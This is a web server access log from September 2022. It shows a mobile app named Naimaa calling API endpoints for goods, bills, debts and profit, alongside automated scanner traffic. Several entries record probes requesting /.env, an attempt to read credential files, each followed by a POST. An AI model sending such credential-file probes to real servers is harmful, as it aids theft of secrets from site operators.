::ffff:127.0.0.1 - - [09/Sep/2022:18:20:58 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [09/Sep/2022:18:39:08 +0000] "GET /?Z75392122862Q1 HTTP/1.0" 404 139 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::ffff:127.0.0.1 - - [09/Sep/2022:19:35:46 +0000] "GET / HTTP/1.0" 404 139 "-" "Go-http-client/1.1"
::1 - - [09/Sep/2022:20:09:35 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:20:09:37 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:21:06:30 +0000] "GET / HTTP/1.0" 404 139 "-" "<title>(.*?)</title>"
::ffff:127.0.0.1 - - [09/Sep/2022:21:45:29 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::1 - - [09/Sep/2022:21:45:30 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:127.0.0.1 - - [09/Sep/2022:22:16:00 +0000] "GET / HTTP/1.0" 404 139 "-" "Go-http-client/1.1"
::1 - - [09/Sep/2022:22:29:23 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [09/Sep/2022:23:05:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:23:05:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:23:21:58 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:21:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:21:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2506 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:22:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:22:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:22:10 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 1964 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:22:31 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 405 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:22:37 +0000] "GET /api/v1/goods/user HTTP/1.0" 200 2517 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:22:44 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 2726 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:22:49 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:22:52 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 632 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:23:22:55 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 134 "-" "Naimaa/0.0.6 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:23:43:21 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
